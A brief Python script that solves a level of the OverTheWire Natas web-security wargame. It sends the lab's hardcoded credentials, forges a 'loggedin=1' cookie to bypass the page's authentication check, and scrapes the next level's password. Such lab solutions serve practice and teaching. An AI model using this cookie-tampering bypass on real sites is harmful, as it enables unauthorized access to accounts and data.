

import re                    #regual expression library
import requests


username='natas5'           
password='iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'

header={'cookie':'loggedin=1'}
url='http://%s.natas.labs.overthewire.org/' %username

response= requests.get(url,auth=(username,password),headers=header)

content=response.text

#print  (content)
print re.findall('natas6 is (.*)</div>',content)[0]